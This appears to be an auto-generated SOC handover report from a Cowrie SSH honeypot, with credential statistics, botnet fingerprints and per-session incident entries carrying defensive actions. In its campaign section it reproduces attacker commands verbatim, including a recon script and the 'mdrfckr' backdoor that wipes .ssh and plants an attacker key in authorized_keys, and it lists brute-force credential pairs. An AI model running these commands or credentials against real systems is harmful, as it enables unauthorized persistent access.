# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-12 |
| **Generated At** | 2026-08-12T07:39:50Z |
| **Shift Time** | 07:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **209** |
| Confirmed Threats | **182** |
| False Positives Filtered | **27** (12.9%) |
| Unique Attacker IPs | **80** |
| Countries of Origin | **28** |
| High Severity Cases | **91** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **118** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **102** |
| Unique Credential Pairs | **71** |
| Unique Usernames | **19** |
| Unique Passwords | **42** |
| Successful Auth Pairs | **97** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `admin` | 23 |
| `root` | 15 |
| `centos` | 12 |
| `debian` | 8 |
| `administrator` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123abc` | 6 |
| `qwerty123456` | 6 |
| `admin` | 6 |
| `123` | 5 |
| `1234` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `centos` | `qwerty123456` | 6 |
| `support` | `support` | 4 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `ubnt` | `dietpi` | 4 |
| `centos` | `123abc` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root123` | `80.94.92.179` | 2026-08-12T04:55:07 |
| `blank` | `passw0rd` | `223.82.86.2` | 2026-08-12T04:55:11 |
| `blank` | `passw0rd` | `122.170.99.195` | 2026-08-12T04:55:19 |
| `root` | `welcome` | `80.94.92.179` | 2026-08-12T04:57:32 |
| `admin` | `123` | `80.94.92.179` | 2026-08-12T04:59:49 |
| `debian` | `123abc` | `176.170.1.244` | 2026-08-12T05:00:27 |
| `debian` | `123abc` | `60.249.252.94` | 2026-08-12T05:00:30 |
| `admin` | `1234` | `80.94.92.179` | 2026-08-12T05:02:13 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-12T05:02:55 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-12T05:02:55 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-12T05:03:02 |
| `admin` | `12345` | `80.94.92.179` | 2026-08-12T05:04:42 |
| `centos` | `123abc` | `210.177.143.61` | 2026-08-12T05:05:23 |
| `centos` | `123abc` | `107.135.117.245` | 2026-08-12T05:05:31 |
| `admin` | `123456` | `80.94.92.179` | 2026-08-12T05:07:06 |
| `support` | `support` | `10.0.0.73` | 2026-08-12T05:09:08 |
| `admin` | `1234567` | `80.94.92.179` | 2026-08-12T05:09:41 |
| `test` | `123321` | `10.0.0.73` | 2026-08-12T05:10:41 |
| `admin` | `12345678` | `80.94.92.179` | 2026-08-12T05:12:20 |
| `centos` | `qwerty123456` | `10.0.0.73` | 2026-08-12T05:13:08 |
| `centos` | `qwerty123456` | `111.70.32.53` | 2026-08-12T05:14:43 |
| `admin` | `123456789` | `80.94.92.179` | 2026-08-12T05:14:47 |
| `centos` | `qwerty123456` | `119.200.229.33` | 2026-08-12T05:14:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `185.226.197.40` | 2026-08-12T05:15:53 |
| `centos` | `123abc` | `10.0.0.73` | 2026-08-12T05:17:10 |
| `admin` | `1234567890` | `80.94.92.179` | 2026-08-12T05:17:13 |
| `admin` | `1q2w3e4r` | `80.94.92.179` | 2026-08-12T05:19:33 |
| `admin` | `P@ssw0rd123` | `80.94.92.179` | 2026-08-12T05:21:53 |
| `admin` | `abc123` | `80.94.92.179` | 2026-08-12T05:24:14 |
| `admin` | `admin123` | `80.94.92.179` | 2026-08-12T05:26:35 |
| `admin` | `letmein` | `80.94.92.179` | 2026-08-12T05:29:04 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.177.222` | 2026-08-12T05:29:16 |
| `*1` | `$4` | `34.76.177.222` | 2026-08-12T05:29:30 |
| `test` | `123321` | `70.91.135.181` | 2026-08-12T05:29:31 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7723` | `34.76.177.222` | 2026-08-12T05:29:32 |
| `root` | `centos` | `117.50.208.104` | 2026-08-12T05:30:53 |
| `centos` | `qwerty123456` | `87.225.108.138` | 2026-08-12T05:31:01 |
| `centos` | `qwerty123456` | `122.160.50.155` | 2026-08-12T05:31:10 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.26` | 2026-08-12T05:31:24 |
| `admin` | `pass123` | `80.94.92.179` | 2026-08-12T05:31:35 |
| `admin` | `password` | `80.94.92.179` | 2026-08-12T05:34:13 |
| `admin` | `password1` | `80.94.92.179` | 2026-08-12T05:36:49 |
| `allen` | `password` | `207.154.230.149` | 2026-08-12T05:38:48 |
| `345gs5662d34` | `345gs5662d34` | `207.154.230.149` | 2026-08-12T05:38:50 |
| `allen` | `3245gs5662d34` | `207.154.230.149` | 2026-08-12T05:38:51 |
| `admin` | `qwerty123` | `80.94.92.179` | 2026-08-12T05:39:03 |
| `admin` | `root123` | `80.94.92.179` | 2026-08-12T05:41:21 |
| `deploy` | `yolped` | `101.32.240.31` | 2026-08-12T05:41:36 |
| `345gs5662d34` | `345gs5662d34` | `101.32.240.31` | 2026-08-12T05:41:40 |
| `deploy` | `3245gs5662d34` | `101.32.240.31` | 2026-08-12T05:41:42 |
| `root` | `Ubuntu2023` | `152.32.254.89` | 2026-08-12T05:42:52 |
| `345gs5662d34` | `345gs5662d34` | `152.32.254.89` | 2026-08-12T05:42:56 |
| `root` | `3245gs5662d34` | `152.32.254.89` | 2026-08-12T05:42:57 |
| `admin1` | `123` | `80.94.92.179` | 2026-08-12T05:43:37 |
| `ubnt` | `qwerty123` | `10.0.0.73` | 2026-08-12T05:44:53 |
| `admin1` | `1234` | `80.94.92.179` | 2026-08-12T05:45:59 |
| `admin` | `admin` | `47.85.8.171` | 2026-08-12T05:47:06 |
| `admin1` | `admin123` | `80.94.92.179` | 2026-08-12T05:48:24 |
| `support` | `support` | `176.53.159.196` | 2026-08-12T05:48:55 |
| `ubnt` | `dietpi` | `92.126.223.175` | 2026-08-12T05:49:11 |
| `ubnt` | `dietpi` | `65.20.217.64` | 2026-08-12T05:49:18 |
| `admin1` | `password1` | `80.94.92.179` | 2026-08-12T05:50:47 |
| `root` | `asd` | `10.0.0.73` | 2026-08-12T05:51:29 |
| `admin` | `admin` | `157.245.213.135` | 2026-08-12T05:52:41 |
| `admin1` | `qwerty123` | `80.94.92.179` | 2026-08-12T05:53:21 |
| `administrator` | `123` | `80.94.92.179` | 2026-08-12T05:55:46 |
| `administrator` | `1234` | `80.94.92.179` | 2026-08-12T05:58:03 |
| `administrator` | `123abc` | `80.94.92.179` | 2026-08-12T06:00:28 |
| `administrator` | `1q2w3e4r` | `80.94.92.179` | 2026-08-12T06:02:46 |
| `administrator` | `admin123` | `80.94.92.179` | 2026-08-12T06:05:08 |
| `ubnt` | `dietpi` | `182.79.218.164` | 2026-08-12T06:05:28 |
| `root` | `ubuntu18svm` | `36.66.16.233` | 2026-08-12T06:05:29 |
| `345gs5662d34` | `345gs5662d34` | `36.66.16.233` | 2026-08-12T06:05:33 |
| `root` | `3245gs5662d34` | `36.66.16.233` | 2026-08-12T06:05:35 |
| `ubnt` | `dietpi` | `221.199.172.66` | 2026-08-12T06:05:41 |
| `administrator` | `qwerty123` | `80.94.92.179` | 2026-08-12T06:07:29 |
| `apache` | `1234` | `80.94.92.179` | 2026-08-12T06:09:48 |
| `backup` | `123` | `80.94.92.179` | 2026-08-12T06:12:03 |
| `backup` | `12345678` | `80.94.92.179` | 2026-08-12T06:14:17 |
| `admin` | `admin` | `120.26.220.254` | 2026-08-12T06:14:56 |
| `backup` | `password` | `80.94.92.179` | 2026-08-12T06:16:28 |
| `daemon` | `123456` | `80.94.92.179` | 2026-08-12T06:18:45 |
| `daemon` | `abc123` | `80.94.92.179` | 2026-08-12T06:21:07 |
| `root` | `techsupport` | `10.0.0.73` | 2026-08-12T06:21:53 |
| `debian` | `123` | `80.94.92.179` | 2026-08-12T06:23:22 |
| `root` | `techsupport` | `120.194.50.39` | 2026-08-12T06:23:31 |
| `root` | `techsupport` | `192.34.128.202` | 2026-08-12T06:23:37 |
| `debian` | `1234` | `80.94.92.179` | 2026-08-12T06:25:43 |
| `debian` | `letmein` | `10.0.0.73` | 2026-08-12T06:25:59 |
| `debian` | `12345` | `80.94.92.179` | 2026-08-12T06:28:01 |
| `debian` | `123456` | `80.94.92.179` | 2026-08-12T06:30:13 |
| `centos` | `admin` | `144.22.210.132` | 2026-08-12T06:37:56 |
| `centos` | `admin` | `65.20.179.251` | 2026-08-12T06:38:10 |
| `centos` | `admin` | `119.152.54.111` | 2026-08-12T06:38:17 |
| `debian` | `letmein` | `111.70.32.53` | 2026-08-12T06:43:07 |
| `admin` | `qwerty12` | `182.156.35.238` | 2026-08-12T06:48:34 |
| `admin` | `qwerty12` | `218.21.241.50` | 2026-08-12T06:48:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **209** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 47 |
| OpenSSH | 24 |
| libssh | 22 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 41 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 22 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 41 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 23 | 22 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 41 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.32.240.31`, `152.32.254.89`, `207.154.230.149`, `36.66.16.233`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **80** |
| Unique ASNs | **55** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS21859` | Zenlayer Inc | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (90)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f124a9883b3d

| Field | Detail |
|---|---|
| **Source IP** | `223.82.86[.]2` |
| **First Seen** | 2026-08-12 04:55 |
| **Last Seen** | 2026-08-12 04:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:55:06` | `cowrie.session.connect` |
| `2026-08-12 04:55:07` | `cowrie.client.version` |
| `2026-08-12 04:55:07` | `cowrie.client.kex` |
| `2026-08-12 04:55:11` | `cowrie.login.success` |
| `2026-08-12 04:55:11` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.82.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.82.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0bf2af4be54

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:55 |
| **Last Seen** | 2026-08-12 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:55:07` | `cowrie.session.connect` |
| `2026-08-12 04:55:07` | `cowrie.client.version` |
| `2026-08-12 04:55:07` | `cowrie.client.kex` |
| `2026-08-12 04:55:07` | `cowrie.login.success` |
| `2026-08-12 04:55:08` | `cowrie.session.params` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.success` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.command.input` |
| `2026-08-12 04:55:08` | `cowrie.log.closed` |
| `2026-08-12 04:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415a37a0c607

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-08-12 04:55 |
| **Last Seen** | 2026-08-12 04:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:55:17` | `cowrie.session.connect` |
| `2026-08-12 04:55:17` | `cowrie.client.version` |
| `2026-08-12 04:55:17` | `cowrie.client.kex` |
| `2026-08-12 04:55:19` | `cowrie.login.success` |
| `2026-08-12 04:55:20` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890010b40d33

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:57 |
| **Last Seen** | 2026-08-12 04:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:57:31` | `cowrie.session.connect` |
| `2026-08-12 04:57:31` | `cowrie.client.version` |
| `2026-08-12 04:57:31` | `cowrie.client.kex` |
| `2026-08-12 04:57:32` | `cowrie.login.success` |
| `2026-08-12 04:57:33` | `cowrie.session.params` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.success` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:33` | `cowrie.command.input` |
| `2026-08-12 04:57:34` | `cowrie.log.closed` |
| `2026-08-12 04:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58664d639a5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:59 |
| **Last Seen** | 2026-08-12 04:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:59:48` | `cowrie.session.connect` |
| `2026-08-12 04:59:48` | `cowrie.client.version` |
| `2026-08-12 04:59:48` | `cowrie.client.kex` |
| `2026-08-12 04:59:49` | `cowrie.login.success` |
| `2026-08-12 04:59:50` | `cowrie.session.params` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.success` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:50` | `cowrie.command.input` |
| `2026-08-12 04:59:51` | `cowrie.log.closed` |
| `2026-08-12 04:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc41ea48aca4

| Field | Detail |
|---|---|
| **Source IP** | `176.170.1[.]244` |
| **First Seen** | 2026-08-12 05:00 |
| **Last Seen** | 2026-08-12 05:00 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:00:12` | `cowrie.session.connect` |
| `2026-08-12 05:00:14` | `cowrie.client.version` |
| `2026-08-12 05:00:14` | `cowrie.client.kex` |
| `2026-08-12 05:00:27` | `cowrie.login.success` |
| `2026-08-12 05:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.170.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `176.170.1[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025696b2a4bb

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-08-12 05:00 |
| **Last Seen** | 2026-08-12 05:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:00:27` | `cowrie.session.connect` |
| `2026-08-12 05:00:28` | `cowrie.client.version` |
| `2026-08-12 05:00:28` | `cowrie.client.kex` |
| `2026-08-12 05:00:30` | `cowrie.login.success` |
| `2026-08-12 05:00:31` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b831f1c8cc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:02 |
| **Last Seen** | 2026-08-12 05:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:02:12` | `cowrie.session.connect` |
| `2026-08-12 05:02:12` | `cowrie.client.version` |
| `2026-08-12 05:02:12` | `cowrie.client.kex` |
| `2026-08-12 05:02:13` | `cowrie.login.success` |
| `2026-08-12 05:02:14` | `cowrie.session.params` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.success` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.command.input` |
| `2026-08-12 05:02:14` | `cowrie.log.closed` |
| `2026-08-12 05:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7d740e16ac

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-12 05:02 |
| **Last Seen** | 2026-08-12 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:02:54` | `cowrie.session.connect` |
| `2026-08-12 05:02:54` | `cowrie.client.version` |
| `2026-08-12 05:02:54` | `cowrie.client.kex` |
| `2026-08-12 05:02:55` | `cowrie.login.success` |
| `2026-08-12 05:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66790a497551

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-12 05:02 |
| **Last Seen** | 2026-08-12 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

